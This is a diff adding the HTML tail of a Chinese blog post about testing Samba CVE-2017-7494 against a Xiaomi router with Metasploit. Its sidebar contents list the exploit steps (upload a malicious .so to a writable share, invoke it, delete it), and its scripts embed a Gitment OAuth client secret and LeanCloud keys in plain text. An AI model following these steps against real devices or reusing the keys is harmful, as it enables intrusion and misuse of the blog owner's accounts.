+<p>由msf给出的poc过程可见，对小米路由器的攻击在第五步出现问题，因此出现Failed to load STATUS_OBJECT_NAME_NOT_FOUND</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>您的支持将鼓励我继续创作！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/Wechatpay.png" alt="Cool-Y 微信支付">
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/Alipay.png" alt="Cool-Y 支付宝">
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Samba/" rel="tag"># Samba</a>
+          
+            <a href="/tags/远程执行/" rel="tag"># 远程执行</a>
+          
+            <a href="/tags/CVE/" rel="tag"># CVE</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/03/23/auto-send-WX/" rel="next" title="利用itchat定时转发微信消息">
+                <i class="fa fa-chevron-left"></i> 利用itchat定时转发微信消息
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/03/28/逆向工程实验/" rel="prev" title="逆向工程与软件破解">
+                逆向工程与软件破解 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      
+        <div id="gitment-container"></div>
+      
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.png" alt="Cool-Y">
+            
+              <p class="site-author-name" itemprop="name">Cool-Y</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">24</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Cool-Y" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:cool.yim@whu.edu.cn" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.instagram.com/yan__han/" target="_blank" title="Instagram">
+                      
+                        <i class="fa fa-fw fa-instagram"></i>Instagram</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#小米路由器与Samba漏洞CVE-2017-7494"><span class="nav-number">1.</span> <span class="nav-text">小米路由器与Samba漏洞CVE-2017-7494</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞描述"><span class="nav-number">1.1.</span> <span class="nav-text">漏洞描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Samba介绍"><span class="nav-number">1.2.</span> <span class="nav-text">Samba介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞成因"><span class="nav-number">1.3.</span> <span class="nav-text">漏洞成因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞复现"><span class="nav-number">1.4.</span> <span class="nav-text">漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#小米路由器"><span class="nav-number">1.4.1.</span> <span class="nav-text">小米路由器</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#攻击：使用metasploit"><span class="nav-number">1.5.</span> <span class="nav-text">攻击：使用metasploit</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#设置攻击参数"><span class="nav-number">1.5.1.</span> <span class="nav-text">设置攻击参数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#执行攻击"><span class="nav-number">1.5.2.</span> <span class="nav-text">执行攻击</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析POC，查找原因"><span class="nav-number">1.6.</span> <span class="nav-text">分析POC，查找原因</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#建立SMB连接。若需要账号密码登录，则必须登录后才能继续"><span class="nav-number">1.6.1.</span> <span class="nav-text">建立SMB连接。若需要账号密码登录，则必须登录后才能继续</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用NetShareEnumAll遍历目标服务器的共享名-ShareName-以及获取对应的共享文件夹下的可写路径-Path"><span class="nav-number">1.6.2.</span> <span class="nav-text">利用NetShareEnumAll遍历目标服务器的共享名(ShareName)以及获取对应的共享文件夹下的可写路径(Path)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用NetShareGetInfo获取共享文件夹的绝对路径-SharePath"><span class="nav-number">1.6.3.</span> <span class="nav-text">利用NetShareGetInfo获取共享文件夹的绝对路径(SharePath)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#上传恶意so文件"><span class="nav-number">1.6.4.</span> <span class="nav-text">上传恶意so文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#调用恶意文件，并执行echo命令打印随机字符串检验是否调用成功"><span class="nav-number">1.6.5.</span> <span class="nav-text">调用恶意文件，并执行echo命令打印随机字符串检验是否调用成功</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#删除恶意so文件，断开smb连接"><span class="nav-number">1.6.6.</span> <span class="nav-text">删除恶意so文件，断开smb连接</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Cool-Y</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+    <span title="Site words total count">13.6k</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+<!-- LOCAL: You can save these files to your site and update links -->
+    
+        
+        <link rel="stylesheet" href="https://aimingoo.github.io/gitmint/style/default.css">
+        <script src="https://aimingoo.github.io/gitmint/dist/gitmint.browser.js"></script>
+    
+<!-- END LOCAL -->
+
+    
+
+    
+      <script type="text/javascript">
+      function renderGitment(){
+        var gitment = new Gitmint({
+            id: window.location.pathname, 
+            owner: 'Cool-Y',
+            repo: 'gitment-comments',
+            
+            lang: "" || navigator.language || navigator.systemLanguage || navigator.userLanguage,
+            
+            oauth: {
+            
+            
+                client_secret: '1c5db4da72df5e6fc318d12afe5f4406f7c54343',
+            
+                client_id: '180955a2c3ae3d966d9a'
+            }});
+        gitment.render('gitment-container');
+      }
+
+      
+      renderGitment();
+      
+      </script>
+    
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("EWwoJgHNdlj6iBjiFlMcabUO-gzGzoHsz", "x8FxDrYG79C8YFrTww9ljo8K");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
